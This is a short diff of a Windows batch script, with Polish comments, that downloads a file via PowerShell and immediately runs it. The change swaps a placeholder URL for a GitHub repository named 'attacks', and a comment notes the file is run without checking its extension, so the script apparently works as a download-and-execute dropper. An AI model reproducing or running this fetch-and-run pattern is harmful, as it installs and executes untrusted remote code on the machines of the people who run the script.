@@ -12,7 +12,7 @@ if not exist "%DEST%" (
 )
 
 :: Pobierz plik z internetu
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/youruser/repo/main/%FILE%' -OutFile '%DEST%\%FILE%'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/petrohemia/attacks/refs/heads/main/%FILE%' -OutFile '%DEST%\%FILE%'"
 
 :: Uruchom bez sprawdzania rozszerzenia
 start "" "%DEST%\%FILE%"
